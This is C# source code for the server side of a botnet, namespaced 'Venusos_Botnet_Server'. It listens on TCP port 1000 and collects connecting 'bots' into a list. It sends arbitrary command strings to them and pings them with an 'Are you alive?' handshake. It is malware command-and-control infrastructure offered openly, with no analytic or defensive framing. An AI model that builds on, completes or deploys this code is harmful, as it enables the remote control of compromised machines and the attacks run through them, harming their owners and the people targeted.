using System.Net.Sockets;
using System.Text;

namespace Venusos_Botnet_Server
{
    public class BotsServer
    {
        public static List<TcpClient> tcpClients = new List<TcpClient>();
        public static void StartListener()
        {
            try
            {
                TcpListener tcpListener = new TcpListener(Tools.GetLocalIP(), 1000);
                tcpListener.Start();
                Task.Run(() =>
                {
                    while (true)
                    {
                        TcpClient? bot = tcpListener.AcceptTcpClient();
                        if (bot != null && bot.Connected && !tcpClients.Contains(bot))
                        {
                            tcpClients.Add(bot);
                        }
                    }
                });
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception: {0}", e);
            }
        }
        public static void Send(TcpClient tcpClient, string data)
        {
            try
            {
                tcpClient.GetStream().Write(Encoding.ASCII.GetBytes(data));
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception: {0}", e);
            }
        }
        public static bool Ping(TcpClient tcpClient)
        {
            try
            {
                NetworkStream networkStream = tcpClient.GetStream();
                networkStream.Write(Encoding.ASCII.GetBytes("Are you alive?"));
                byte[] bytes = new byte[256];
                string data = null;
                int i;
                while ((i = networkStream.Read(bytes, 0, bytes.Length)) != 0)
                {
                    data = Encoding.ASCII.GetString(bytes, 0, i);
                    if (data == "I am alive!")
                    {
                        return true;
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception: {0}", e);
            }
            return false;
        }
    }
}
